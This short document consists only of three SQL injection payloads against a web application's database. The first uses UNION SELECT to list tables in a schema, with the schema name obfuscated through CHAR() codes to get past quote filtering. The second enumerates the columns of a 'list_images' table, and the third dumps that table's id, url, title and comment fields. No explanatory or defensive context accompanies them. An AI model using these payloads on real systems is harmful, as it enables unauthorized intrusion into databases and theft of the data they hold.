1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=CHAR(077, 101, 109, 098, 101, 114, 095, 105, 109, 097, 103, 101, 115)

 1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(077, 101, 109, 098, 101, 114, 095, 105, 109, 097, 103, 101, 115) AND TABLE_NAME = CHAR(108, 105, 115, 116, 095, 105, 109, 097, 103, 101, 115)

1 UNION SELECT 1, CONCAT(id,url,title,comment) FROM list_images